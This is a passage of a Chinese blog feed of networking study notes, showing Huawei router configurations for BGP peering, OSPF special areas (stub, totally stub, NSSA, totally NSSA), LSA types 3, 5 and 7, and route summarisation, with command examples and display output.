class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]int</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R1-G0/0/0]ip</span> <span class="string">add 192.168.12.1 24</span></span><br><span class="line"><span class="attr">[R1-G0/0/0]int</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">add 192.168.14.1 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area-0.0.0.0]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area-0.0.0.0]quit</span></span><br><span class="line"><span class="attr">[R1-ospf-1]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]bgp</span> <span class="string">200  //开启BGP，配置AS200</span></span><br><span class="line"><span class="attr">[R1-bgp]router-id</span> <span class="string">1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.14.4 as 100      //和R4建立外部邻居</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.23.3 as 200      //和R3建立内部邻居</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.23.3 next-hop-local  //修改下一跳 </span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.2 as 200          //和R2建立内部邻居</span></span><br><span class="line"><span class="attr">[R1-bgp]peer</span> <span class="string">192.168.12.2 next-hop-local  //修改下一跳</span></span><br></pre></td></tr></table></figure><p><strong>配置R2</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]int</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R2-G0/0/0]ip</span> <span class="string">add 192.168.12.2 24</span></span><br><span class="line"><span class="attr">[R2-G0/0/0]int</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[R2-G0/0/1]ip</span> <span class="string">add 192.168.23.2 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area-0.0.0.0]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area-0.0.0.0]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area-0.0.0.0]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]bgp</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[R2-bgp]router-id</span> <span class="string">2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">192.168.12.1 as 200</span></span><br><span class="line"><span class="attr">[R2-bgp]peer</span> <span class="string">192.168.23.3 as 200</span></span><br></pre></td></tr></table></figure><p><strong>配置R3</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R3]int</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R3-G0/0/0]ip</span> <span class="string">add 192.168.23.3 24</span></span><br><span class="line"><span class="attr">[R3-G0/0/0]int</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[R3-G0/0/1]ip</span> <span class="string">add 192.168.35.3 24</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]ospf</span> <span class="string">1 router-id 3.3.3.3</span></span><br><span class="line"><span class="attr">[R3-ospf-1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R3-ospf-1-area-0.0.0.0]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R3-ospf-1-area-0.0.0.0]quit</span></span><br><span class="line"><span class="attr">[R3-ospf-1]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R3]bgp</span> <span class="string">200</span></span><br><span class="line"><span class="attr">[R3-bgp]router-id</span> <span class="string">3.3.3.3</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">192.168.12.1 as 200    //和R1建立内部邻居</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">192.168.12.1 next-hop-local  //修改下一跳</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">192.168.23.2 as 200    //和R2建立内部邻居</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">192.168.23.2 next-hop-local  //修改下一跳</span></span><br><span class="line"><span class="attr">[R3-bgp]peer</span> <span class="string">192.168.35.5 as 300    //和R5建立外部邻居</span></span><br></pre></td></tr></table></figure><p><strong>配置R5</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R5]int</span> <span class="string">g0/0/0</span></span><br><span class="line"><span class="attr">[R5-G0/0/0]ip</span> <span class="string">add 192.168.35.5 24</span></span><br><span class="line"><span class="attr">[R5-G0/0/0]int</span> <span class="string">lo0</span></span><br><span class="line"><span class="attr">[R5-LoopBack0]ip</span> <span class="string">add 10.10.5.5 32</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R5]bgp</span> <span class="string">300</span></span><br><span class="line"><span class="attr">[R5-bgp]router-id</span> <span class="string">5.5.5.5</span></span><br><span class="line"><span class="attr">[R5-bgp]peer</span> <span class="string">192.168.35.3 as 200   //和R3建立外部邻居</span></span><br><span class="line"><span class="attr">[R5-bgp]network</span> <span class="string">10.10.5.5 32       //注入路由</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 骨干网与WLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网路由4</title>
      <link href="/posts/routing4.html"/>
      <url>/posts/routing4.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网路由"><a href="#园区网路由" class="headerlink" title="园区网路由"></a>园区网路由</h1><h2 id="Stub区域"><a href="#Stub区域" class="headerlink" title="Stub区域"></a>Stub区域</h2><h3 id="OSPF特殊区域"><a href="#OSPF特殊区域" class="headerlink" title="OSPF特殊区域"></a>OSPF特殊区域</h3><p><strong>OSPF分为区域和特殊区域</strong></p><p><strong>OSPF普通区域：</strong></p><ul><li>包括标准区域和骨干区域</li></ul><p><strong>OSPF特殊区域：</strong></p><ul><li>Stub</li><li>Totally Stub</li><li>NSSA</li><li>Totally NSSA</li></ul><table><thead><tr><th align="left">区域类型</th><th>区域作用</th></tr></thead><tbody><tr><td align="left">普通区域</td><td>普通区域包括标准区域和骨干区域<br />标准区域是最通用的区域，它传输区域内路由，区域间路由和外部路由<br />骨干区域是连接所有其他OSPF区域的中央区域，骨干区域用Area 0表示</td></tr><tr><td align="left">Stub区域</td><td>不学习4、5类LSA、不允许引入外部路由，只发布域内路由和域间路由<br />在Stub区域中，数据库和路由表规模都会大大减少<br />依靠该区域的ABR发布默认的3类LSA与外部通信</td></tr><tr><td align="left">Totally Stub区域</td><td>不学习3、4、5类LSA、不允许引入外部路由，只发布域内路由<br />在Totally Stub区域中，数据库和路由表规模都会大大减少<br />依靠该区域的ABR发布默认的3类LSA与外部通信</td></tr><tr><td align="left">NSSA区域</td><td>NSSA区域不学习4、5类LSA，但是NSSA区域允许通过7类LSA引入外部路由<br />由ASBR发布7类LSA通告给本区域，这些7类LSA在ABR中转换成5类LSA，在整个OSPF网络中泛洪<br />依靠NSSA区域内的ABR发布默认7类LSA实现和外部通信</td></tr><tr><td align="left">Totally NSSA区域</td><td>Totally NSSA区域不学习3、4、5类LSA，但是NSSA区域允许通过7类LSA引入外部路由<br />由ASBR发布7类LSA通告给本区域，这些7类LSA在ABR中转换成5类LSA，在整个OSPF网络中泛洪<br />依靠NSSA区域内的ABR发布默认3类和7类LSA实现和外部通信</td></tr></tbody></table><p><strong>Stub区域作用</strong></p><ul><li>保护一个区域不受来自外部链路的影响</li><li>缩减LSDB和路由表的规模，减少路由信息数量，降低设备压力</li></ul><p><strong>Stub区域特点</strong></p><ul><li>学习1类、2类、3类LSA</li><li>不学习4类、5类LSA</li><li>Stub区域的ABR会自动生成一条默认的3类LSA，实现和外部通信</li><li>骨干区域不能被配置为Stub区域</li><li>Stub区域中的所有路由器都必须将该区域设置为Stub</li><li>Stub区域内不能引入也不能接收AS外部路由</li></ul><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area</span> <span class="string">0.0.0.12]stub             //将区域12设置为stub区域</span></span><br><span class="line"></span><br><span class="line"><span class="attr">如果该区域有多个路由器，则需要全部设置为stub</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area</span> <span class="string">0.0.0.12]stub             //将区域12设置为stub区域</span></span><br></pre></td></tr></table></figure><h2 id="Totally-Stub区域"><a href="#Totally-Stub区域" class="headerlink" title="Totally Stub区域"></a>Totally Stub区域</h2><h3 id="Stub区域的不足"><a href="#Stub区域的不足" class="headerlink" title="Stub区域的不足"></a>Stub区域的不足</h3><p><strong>Stub区域的不足</strong></p><ul><li>Stub虽然可以不受外部链路的影响，但是其他区域，依然会影响这个Stub区域的稳定性</li><li>Stub区域中，依然有很多其他区域的3类LSA，数据库依然庞大，依然会消耗设备资源和带宽资源</li></ul><p><strong>Stub区域的优化</strong></p><ul><li>不要4类、5类LSA，也不要3类LSA</li><li>具备这种特点的区域，称之为Totally Stub区域（完全末梢区域）</li></ul><h3 id="Totally-Stub"><a href="#Totally-Stub" class="headerlink" title="Totally Stub"></a>Totally Stub</h3><p><strong>Totally Stub作用：</strong></p><ul><li>保护一个区域不受来自外部链路的影响，也不受来自区域间链路的影响</li><li>缩减LSDB和路由表的规模，减少路由信息数量，降低设备压力</li></ul><p><strong>Totally Stub区域特点：</strong></p><ul><li>学习1类、2类LSA</li><li>不学习3类、4类、5类LSA</li><li>Totally Stub区域的ABR会自动生成一条默认的3类LSA，实现和外部通信</li><li>骨干区域不能被配置为Stub区域</li><li>Totally Stub区域的ABR上需要配置stub no-summary</li><li>Totally Stub区域内不能引入也不接收AS外部路由</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area</span> <span class="string">0.0.0.12]stub             //将区域12设置为stub区域</span></span><br><span class="line"></span><br><span class="line"><span class="attr">在Stub区域内ABR上配置</span></span><br><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area</span> <span class="string">0.0.0.12]stub no-summary  //将区域12的ABR上配置</span></span><br></pre></td></tr></table></figure><h2 id="NSSA区域"><a href="#NSSA区域" class="headerlink" title="NSSA区域"></a>NSSA区域</h2><h3 id="Stub区域存在的问题"><a href="#Stub区域存在的问题" class="headerlink" title="Stub区域存在的问题"></a>Stub区域存在的问题</h3><p><strong>Stub区域存在的问题：</strong></p><ul><li>在Stub区域是无法引入外部路由</li><li>对于既需要引入外部路由又要进行保护的末梢区域，Stub和Totally Stub区域就不能满足需求了</li></ul><p><strong>NSSA区域和Stub区域区别</strong></p><ul><li>NSSA和Stub非常相似，不要其他区域的4类、5类LSA</li><li>但是NSSA区域中的路由器可以通过7类LSA，引入外部路由</li></ul><h3 id="2、NSSA区域"><a href="#2、NSSA区域" class="headerlink" title="2、NSSA区域"></a>2、NSSA区域</h3><p><strong>NSSA区域作用：</strong></p><ul><li>保护一个区域不受来自外部链路的影响，又可以引入外部路由</li><li>缩减LSDB和路由表的规模，减少路由信息数量，降低设备压力</li></ul><p><strong>NSSA区域特点</strong></p><ul><li>学习1类、2类、3类、7类LSA</li><li>不学习4类、5类的LSA</li><li>NSSA区域中的路由器可以通过7类LSA，引入外部路由</li><li>NSSA区域的ABR会自动生成一条默认的7类LSA，实现和外部通信</li><li>7类的LSA只能在特殊区域NSSA内部传播，ABR会将7类的LSA转成5类的LSA</li><li>骨干区域不能被配置为NSSA区域</li><li>NSSA区域继承了Stub区域的优点，并且还能引入外部路由</li></ul><h3 id="配置命令-2"><a href="#配置命令-2" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area</span> <span class="string">0.0.0.12]nssa             //将区域12设置为nssa区域</span></span><br><span class="line"></span><br><span class="line"><span class="attr">如果该区域有多个路由器，则需要全部设置为stub</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area</span> <span class="string">0.0.0.12]nssa             //将区域12设置为nssa区域</span></span><br></pre></td></tr></table></figure><h2 id="Totally-NSSA区域"><a href="#Totally-NSSA区域" class="headerlink" title="Totally NSSA区域"></a>Totally NSSA区域</h2><h3 id="NSSA区域的不足"><a href="#NSSA区域的不足" class="headerlink" title="NSSA区域的不足"></a>NSSA区域的不足</h3><p><strong>NSSA区域的不足</strong></p><ul><li>但是本公司内的其他区域，依然会影响这个NSSA区域的稳定性</li><li>数据库依然庞大，依然会消耗设备资源和带宽资源</li></ul><p><strong>NSSA区域的优化</strong></p><ul><li>不要4类、5类LSA，也不要3类LSA</li><li>具备这种特点的区域，称之为Totally NSSA区域</li></ul><h3 id="Totally-NSSA区域-1"><a href="#Totally-NSSA区域-1" class="headerlink" title="Totally NSSA区域"></a>Totally NSSA区域</h3><p><strong>Totally NSSA区域作用：</strong></p><ul><li>保护一个区域不受外部链路和区域间链路影响，又可以引入外部路由</li><li>缩减LSDB和路由表的规模，减少路由信息数量，降低设备压力</li></ul><p><strong>Totally NSSA区域特点</strong></p><ul><li>学习1类、2类、7类LSA</li><li>不学习3类、4类、5类LSA</li><li>Totally NSSA区域的ABR路由器需要配置nssa no-summary</li><li>Totally NSSA区域中的路由器可以通过7类LSA，引入外部路由</li><li>Totally NSSA区域的ABR会自动生成一条默认3类和一条默认7类的LSA</li><li>7类LSA只能在特殊区域NSSA内部传播，ABR会将7类LSA转化为5类LSA</li><li>骨干区域不能配置为NSSA区域</li></ul><h3 id="配置命令-3"><a href="#配置命令-3" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R1-ospf-1-area</span> <span class="string">0.0.0.12]nssa             //将区域12设置为nssa区域</span></span><br><span class="line"></span><br><span class="line"><span class="attr">在NSSA区域内ABR上配置</span></span><br><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R2-ospf-1-area</span> <span class="string">0.0.0.12]nssa no-summary  //将区域12的ABR上配置</span></span><br></pre></td></tr></table></figure><h3 id="7类LSA详解"><a href="#7类LSA详解" class="headerlink" title="7类LSA详解"></a>7类LSA详解</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1-ospf-1]display</span> <span class="string">ospf lsdb nssa 192.168.4.0</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 1.1.1.1</span></span><br><span class="line">         <span class="attr">Area</span>: <span class="string">0.0.0.12</span></span><br><span class="line"> <span class="attr">Link</span> <span class="string">State Database </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="attr">Type</span>      : <span class="string">NSSA                      //表示的是7类的LSA</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">id     : 192.168.4.0               //这条LSA的名字即外部路由的网段</span></span><br><span class="line">  <span class="attr">Adv</span> <span class="string">rtr   : 1.1.1.1                   //发布这条LSA的路由器，ASBR的router-id</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">age    : 27                        //作用:仅仅用于在NSSA区域中，用于表示外部路由</span></span><br><span class="line">  <span class="attr">Len</span>       : <span class="string">36                        //特点:只有NSSA区域的ASBR可以产生7类LSA，7类LSA只能在NSSA区域以及TotallyNSSA区域内部传输</span></span><br><span class="line">  <span class="attr">Options</span>   :  <span class="string">NP                             为了将NSSA区域引入的外部路由发布到其它区域，需要把Type7LSA转化为Type5LSA以便在整个OSPF网络中通告</span></span><br><span class="line">  <span class="attr">seq#</span>      : <span class="string">80000001 </span></span><br><span class="line">  <span class="attr">chksum</span>    : <span class="string">0x6779</span></span><br><span class="line">  <span class="attr">Net</span> <span class="string">mask  : 255.255.255.0 </span></span><br><span class="line">  <span class="attr">TOS</span> <span class="string">0  Metric: 1 </span></span><br><span class="line">  <span class="attr">E</span> <span class="string">type    : 2</span></span><br><span class="line">  <span class="attr">Forwarding</span> <span class="string">Address : 192.168.12.1 </span></span><br><span class="line">  <span class="attr">Tag</span>       : <span class="string">1 </span></span><br><span class="line">  <span class="attr">Priority</span>  : <span class="string">Low</span></span><br></pre></td></tr></table></figure><h2 id="区域间路由汇总"><a href="#区域间路由汇总" class="headerlink" title="区域间路由汇总"></a>区域间路由汇总</h2><h3 id="路由汇总"><a href="#路由汇总" class="headerlink" title="路由汇总"></a>路由汇总</h3><p><strong>路由汇总</strong></p><ul><li>路由汇总又被称为路由聚合，即是将一组前缀相同的路由汇聚成一条路由，从而达到减小路由表规模以及优化设备资源利用率的目的，我们把汇聚之前的这组路由称为精细路由或明细路由，把汇聚之后的这条路由称为汇总路由或聚合路由</li></ul><p><strong>OSPF路由汇总的类型</strong></p><ul><li><p>在ABR执行路由汇总：对区域间的路由执行路由汇总</p><ul><li>区域间路由汇总，也叫3类LSA汇总 ，也叫ABR汇总</li><li>区域间路由汇总，是在ABR中配置，在区域中配置</li><li>汇总的是用network 注入的内部路由</li></ul></li><li><p>在ASBR执行路由汇总：对引入的外部路由执行路由汇总</p><ul><li>外部路由汇总，也叫5类LSA汇总 ，也叫ASBR汇总</li><li>外部路由汇总，是在ASBR中配置，在OSPF下配置，不需要进入区域</li><li>汇总的是用import-route 引入的外部路由</li></ul></li></ul><h3 id="路由汇总作用"><a href="#路由汇总作用" class="headerlink" title="路由汇总作用"></a>路由汇总作用</h3><ul><li>减少维护的数据库规模</li><li>减少路由表维护数量</li><li>减少其他区域不稳定链路的影响</li></ul><h3 id="配置命令-4"><a href="#配置命令-4" class="headerlink" title="配置命令"></a>配置命令</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">区域间路由汇总：</span></span><br><span class="line"><span class="attr">在ABR设备上配置</span></span><br><span class="line"><span class="attr">abr-summary</span> <span class="string">10.10.0.0 255.255.0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">域外路由汇总</span></span><br><span class="line"><span class="attr">在ASBR设备上配置</span></span><br><span class="line"><span class="attr">asbr-summary</span> <span class="string">20.20.0.0 255.255.0.0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网路由3</title>
      <link href="/posts/routing3.html"/>
      <url>/posts/routing3.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网路由"><a href="#园区网路由" class="headerlink" title="园区网路由"></a>园区网路由</h1><h2 id="区域间路由"><a href="#区域间路由" class="headerlink" title="区域间路由"></a>区域间路由</h2><h3 id="大型网络中，单区域OSPF存在的问题"><a href="#大型网络中，单区域OSPF存在的问题" class="headerlink" title="大型网络中，单区域OSPF存在的问题"></a>大型网络中，单区域OSPF存在的问题</h3><p><strong>为什么要划分多区域</strong></p><ul><li>数据库庞大</li><li>路由表庞大</li><li>设备压力大，资源消耗高</li><li>无法进行路由汇总</li><li>拓扑变更，引发路由重计算</li></ul><h3 id="区域划分"><a href="#区域划分" class="headerlink" title="区域划分"></a>区域划分</h3><p><strong>区域内部路由器（Internal Router）</strong></p><ul><li>该类设备的所有接口都属于同一个OSPF区域。如RRR5</li></ul><p><strong>区域边界路由器（Area Border Router）</strong></p><ul><li>该类设备接口分别连接两个及两个以上不同区域。如RR3</li></ul><p><img src="/../img/img_artical/net_sec/6.3.1.png" alt="6.3.1"></p><h3 id="区域间路由接口"><a href="#区域间路由接口" class="headerlink" title="区域间路由接口"></a>区域间路由接口</h3><p><strong>OSPF区域间路由传递是通过ABR产生的3类LSA实现的</strong></p><ul><li>R2依据Area 1内的1类LSA及2类LSA计算得出192.168.1.0&#x2F;24的路由（区域内路由），并将该路由通过3类LSA通告到Area 0。R3根据该LSA可计算出到达192.168.1.0&#x2F;24的区域间路由</li><li>R3重新生成一份3类LSA通告到Area 2中，所有OSPF区域都有192.168.1.0&#x2F;24的路由</li></ul><p><img src="/../img/img_artical/net_sec/6.3.2.png" alt="6.3.2"></p><h2 id="Network-Summary-LSA"><a href="#Network-Summary-LSA" class="headerlink" title="Network Summary LSA"></a>Network Summary LSA</h2><h3 id="Network-Summary-LSA详解"><a href="#Network-Summary-LSA详解" class="headerlink" title="Network Summary LSA详解"></a>Network Summary LSA详解</h3><p><strong>Network Summary LSA（3类LSA）：</strong></p><ul><li>Network Summary LSA（3类LSA）由ABR产生，用于一个区域通告到另一个区域的路由</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;R1&gt;dis</span> <span class="string">ospf lsdb summary 192.168.1.0</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">Type</span>      : <span class="string">Sum-Net          //表示的是3类的LSA</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">id     : 192.168.1.0      //这条LSA的名字，是区域之间的路由网段</span></span><br><span class="line">  <span class="attr">Adv</span> <span class="string">rtr   : 2.2.2.2          //发布这条LSA的路由器，是ABR的Router-id</span></span><br><span class="line">  <span class="attr">Ls</span> <span class="string">age    : 1281            </span></span><br><span class="line">  <span class="attr">Len</span>       : <span class="string">28 </span></span><br><span class="line">  <span class="attr">Options</span>   :  <span class="string">E               //作用：将区域内的2类LSA计算出来的路由，变成3类LSA在其他区域泛洪(广播)实现区域与区域之间的通信</span></span><br><span class="line">  <span class="attr">seq#</span>      : <span class="string">80000005         //特点:只有ABR可以产生3类LSA，3类LSA的传输范围仅仅限于同一个区域内</span></span><br><span class="line">  <span class="attr">chksum</span>    : <span class="string">0x914f                 3类LSA在传输过程中，每经过1个ABR，3类LSA的advRouter就会变成所经过的那个ABR的Router-id</span></span><br><span class="line">  <span class="attr">Net</span> <span class="string">mask  : 255.255.255.0    //目的地址的掩码：192.168.2.0/24</span></span><br><span class="line">  <span class="attr">Tos</span> <span class="string">0  metric: 5             //开销值是5，从下一跳到目的地址的cost值</span></span><br><span class="line">  <span class="attr">Priority</span>  : <span class="string">Low</span></span><br></pre></td></tr></table></figure><p><strong>LSA的三元组：链路状态类型、链路状态ID、通告路由器三元组唯一地标识了一个LSA</strong></p><h2 id="外部路由"><a href="#外部路由" class="headerlink" title="外部路由"></a>外部路由</h2><h3 id="外部路由引入"><a href="#外部路由引入" class="headerlink" title="外部路由引入"></a>外部路由引入</h3><p><strong>ASBR（AS Border Router）：</strong></p><ul><li>自治系统边界路由器，只要一台OSPF设备引入了外部路由，它就成为了ASBR</li><li>ASBR将外部路由以AS-external LSA（5类LSA）的形式在OSPF网络内泛洪</li></ul><p><img src="/../img/img_artical/net_sec/6.3.3.png" alt="6.3.3"></p><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>配置R7去往公司内网的路由条目</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R7]ip</span> <span class="string">route-static 192.168.0.0 16 192.168.67.6</span></span><br></pre></td></tr></table></figure><p><strong>配置R6去往PC3的静态路由</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R6]ip</span> <span class="string">route-static 192.168.3.0 24 192.168.67.7</span></span><br></pre></td></tr></table></figure><p><strong>在R6上，宣告静态路由进入OSPF区域</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R6]ospf</span> <span class="string">1</span></span><br><span class="line"><span class="attr">[R6-ospf-1]import-route</span> <span class="string">static   //通过该命令产生的路由，称为OSPF外部路由</span></span><br></pre></td></tr></table></figure><h2 id="AS-external-LSA"><a href="#AS-external-LSA" class="headerlink" title="AS-external LSA"></a>AS-external LSA</h2><h3 id="AS-external-LSA详解"><a href="#AS-external-LSA详解" class="headerlink" title="AS-external LSA详解"></a>AS-external LSA详解</h3><p><strong>AS-external LSA（5类LSA）：</strong></p><ul><li>由ASBR产生，描述到达AS外部的路由，该LSA会被通告到所有的区域（除了Stub区域和NSSA区域）</li><li>5类LSA不属于任何一个区域</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 